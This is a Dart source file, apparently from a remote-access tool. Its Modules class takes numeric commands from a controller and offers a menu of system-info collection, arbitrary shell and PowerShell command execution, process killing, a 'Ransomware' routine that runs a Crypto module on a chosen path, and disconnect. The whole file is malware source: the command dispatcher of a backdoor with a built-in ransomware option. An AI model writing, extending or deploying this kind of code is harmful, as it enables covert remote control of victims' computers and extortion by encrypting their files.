import 'package:client/host.dart';
import 'package:client/modules/system.dart';
import 'package:client/modules/crypto.dart';
import 'package:client/util/manipulate_data.dart';

class Modules {
  System _system;
  Crypto _crypto;

  Modules() {
    _system = System();
    _crypto = Crypto();
  }

  Future<String> selector({int id, String parameter, Host host}) async {
    switch (id) {
      case 1:
        return getInfo().toString();
      case 2:
        Map retn = await executableCommand(parameter);
        return retn.toString();
      case 3:
        Map retn = await executableCommandInPowerShell(parameter);
        return retn.toString();
      case 4:
        if (ManipulateData.checkStringIsInt(parameter)) {
          Map retn = await killProcess(int.parse(parameter));
          return retn.toString();
        }
        return "parameter not is a integer number";
      case 5:
        return ransomware(parameter).toString();
      case 6:
        destroyCurrentConnection(host);
        return "";
    }
  }

  String modulesAvailableForSelection() {
    String result = "\n=============\n";
    result += "[1] - Info\n";
    result += "[2] - Executable Command\n";
    result += "[3] - Executable Command in PowerShell *(Windows Only)\n";
    result += "[4] - Kill Process\n";
    result += "[5] - Ransomware\n";
    result += "[6] - Exit";
    result += "\n=============\n";
    return result;
  }

  Map getInfo() {
    return _system.getInfoFromSystem();
  }

  Future<Map> executableCommand(String command) {
    return _system.executableCommand(command);
  }

  Future<Map> executableCommandInPowerShell(String command) {
    return _system.executableCommandInPowerShell(command);
  }

  Future<Map> killProcess(int pId) {
    return _system.killProcess(pId);
  }

  Future<Map> ransomware(String path) {
    return _crypto.run(path);
  }

  void destroyCurrentConnection(Host host) {
    host.disconnect();
  }
}
